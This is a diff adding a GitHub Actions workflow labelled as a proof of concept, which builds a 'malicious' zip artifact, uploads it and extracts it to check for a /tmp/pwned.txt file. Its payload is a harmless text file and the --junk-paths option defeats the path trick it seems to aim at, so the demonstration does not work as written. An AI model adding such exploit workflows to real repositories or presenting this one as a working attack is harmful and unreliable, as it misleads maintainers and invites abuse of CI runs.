@@ -1,0 +1,27 @@
+name:  PoC
+
+on: [push, pull_request_target]
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Prepare exploit zip
+        run: |
+          echo "You got hacked" > poc.txt
+          zip -q -r evil.zip poc.txt --junk-paths
+      - name: Upload malicious artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: exploit
+          path: evil.zip
+
+      - name: Simulate extraction
+        run: |
+          mkdir extracted
+          unzip evil.zip -d extracted
+          echo "::notice file=/tmp/pwned.txt::File content:"
+          cat /tmp/pwned.txt || echo "File not written"
